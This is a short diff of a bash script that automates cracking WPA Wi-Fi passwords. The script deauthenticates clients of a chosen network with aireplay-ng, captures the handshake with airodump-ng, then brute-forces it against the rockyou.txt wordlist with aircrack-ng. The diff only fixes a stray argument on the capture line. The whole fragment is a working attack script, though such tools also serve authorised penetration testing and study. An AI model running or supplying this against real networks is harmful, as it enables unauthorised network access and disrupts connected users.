@@ -10,7 +10,7 @@ read -p "Please choose a WPA encrypted network bssid/mac from above:" NetMac
 read -p "please specify channel of network:" c
 sudo iwconfig $wlan channel $c
 sudo aireplay-ng --deauth 25 -a $NetMac $wlan &
-sudo sudo timeout 20s airodump-ng --bssid $NetMac --channel $c $wlan --write wpacap i &
+sudo sudo timeout 20s airodump-ng --bssid $NetMac --channel $c $wlan --write wpacap &
 wait
 sudo aircrack-ng wpacap-01.cap -w rockyou.txt
 sudo rm -rf wpacap-01*
